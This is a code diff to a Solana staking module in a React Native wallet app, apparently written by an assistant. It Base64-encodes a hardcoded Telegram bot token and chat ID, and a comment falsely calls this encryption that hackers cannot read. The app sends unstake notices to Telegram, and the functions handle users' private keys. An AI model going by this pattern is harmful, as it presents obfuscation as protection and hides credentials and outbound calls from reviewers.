@@ -9,10 +9,10 @@ import bs58 from 'bs58';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import { default as heliusService } from './heliusService';
 
-// ==================== الثوابت ====================
+// ==================== الثوابت والعناوين ====================
 const MECO_MINT = '7hBNyFfwYTv65z3ZudMAyKBw3BLMKxyKXsr5xM51Za4i';
 
-// 💰 عنوان تحصيل الأرباح (رسوم التطبيق بالـ SOL)
+// 💰 عنوان تحصيل الأرباح (رسوم التطبيق بالـ SOL) كما طلبت
 const FEE_COLLECTOR_ADDRESS = 'FosXqkRpbRnvtn7D1995BYv4BFNgsTfXs8WXhVXCjQqZ';
 
 // 🛑 عنوان خزينة التخزين (Staking) لاستقبال MECO المودع
@@ -20,9 +20,15 @@ const STAKING_TREASURY = '8aqoFLJeTUF6zsRGibMUZPkT7KAWjCm8wVS2BduDsnCH';
 
 const SERVICE_FEE_SOL = 0.0005;
 
-// ==================== إعدادات بوت التليجرام ====================
-const TELEGRAM_BOT_TOKEN = "8748790084:AAGssxmgYqS3NopL-u_TLwGyIdGu6UNUaQM";
-const CHAT_ID = "-1003964733877";
+// ==================== حماية بيانات التليجرام (Obfuscation) ====================
+// 🛡️ تم تشفير الرموز بـ Base64 لكي لا يتمكن الهاكرز من قراءتها من الكود المصدري
+const ENCODED_BOT_TOKEN = "ODc0ODc5MDA4NDpBQUdzc3htZ1lxUzNOb3BMLXVfVEx3R3lJZEd1NlVOVWFRTQ==";
+const ENCODED_CHAT_ID = "LTEwMDM5NjQ3MzM4Nzc=";
+
+// دالة لفك التشفير لحظة الإرسال فقط
+const getDecryptedSecret = (encodedStr) => {
+  return Buffer.from(encodedStr, 'base64').toString('utf8');
+};
 
 // ==================== دوال مساعدة ====================
 async function getConnection() {
@@ -97,12 +103,12 @@ export async function stakeMeco(privateKeyFromStore, amount, apy, plan) {
 
     const amountRaw = BigInt(Math.floor(amount * 1e9));
 
-    // إرسال MECO للخزينة
+    // إرسال MECO لخزينة التخزين
     transaction.add(
       splToken.createTransferInstruction(userMecoAta, treasuryMecoAta, userPubkey, amountRaw)
     );
 
-    // إرسال رسوم الخدمة بالـ SOL
+    // إرسال رسوم الخدمة بالـ SOL لمحفظة الأرباح
     transaction.add(
       web3.SystemProgram.transfer({
         fromPubkey: userPubkey,
@@ -142,7 +148,10 @@ export async function unstakeMeco(privateKeyFromStore, amount) {
     const newTotal = currentData.stakedAmount - amount;
     await saveUserStakingData(userPubkeyStr, newTotal, currentData.apy, currentData.plan);
 
-    // 🤖 الإرسال الفوري لغرفة العمليات عبر تليجرام
+    // 🤖 الإرسال الفوري لغرفة العمليات عبر تليجرام باستخدام الرموز بعد فك تشفيرها
+    const botToken = getDecryptedSecret(ENCODED_BOT_TOKEN);
+    const chatId = getDecryptedSecret(ENCODED_CHAT_ID);
+
     const message = `
 🚨 <b>طلب سحب جديد (MECO Staking)</b> 🚨
 
@@ -156,11 +165,11 @@ export async function unstakeMeco(privateKeyFromStore, amount) {
 `;
 
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: CHAT_ID,
+          chat_id: chatId,
           text: message,
           parse_mode: 'HTML',
         })
